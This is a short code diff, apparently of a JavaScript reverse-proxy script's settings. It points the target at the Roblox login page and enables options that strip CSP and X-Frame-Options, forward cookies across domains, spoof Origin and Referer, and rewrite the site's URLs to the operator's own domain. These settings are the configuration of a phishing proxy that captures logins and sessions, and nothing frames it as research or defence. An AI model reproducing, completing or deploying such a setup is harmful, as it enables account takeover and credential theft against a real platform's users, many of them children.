@@ -1,12 +1,12 @@
 /* ===== SET YOUR TARGET HERE ===== */
-const TARGET = "https://example.com";
+const TARGET = "https://roblox.com/login";
 /* ================================ */
 
 const OPTS = {
   rewriteBody:    true,   // swap target URLs -> your proxy URL inside html/css/js/json
   stripSecurity:  true,   // drop CSP / X-Frame-Options so pages render on your domain
   forwardCookies: true,   // pass cookies through (Domain= attribute stripped)
-  cors:           false,  // permissive CORS headers — turn ON if you're proxying an API
+  cors:           true,  // permissive CORS headers — turn ON if you're proxying an API
   spoofOrigin:    true,   // send Origin/Referer as the target, not your domain
 };
 
